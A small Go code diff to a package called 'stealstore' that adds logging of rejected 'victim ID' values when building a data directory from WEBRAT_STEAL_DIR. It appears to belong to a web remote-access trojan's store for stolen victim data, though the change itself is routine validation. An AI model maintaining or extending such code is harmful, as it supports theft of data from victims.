@@ -3,6 +3,7 @@ package stealstore
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -15,6 +16,7 @@ var safeIDRe = regexp.MustCompile(`^[A-Za-z0-9_-]+$`)
 func DataDir(victimID string) string {
 	victimID = strings.TrimSpace(victimID)
 	if victimID == "" || !safeIDRe.MatchString(victimID) {
+		log.Printf("[stealstore] invalid victim ID: %q (matches safe regex: %v)", victimID, safeIDRe.MatchString(victimID))
 		victimID = "_invalid_"
 	}
 	base := strings.TrimSpace(os.Getenv("WEBRAT_STEAL_DIR"))
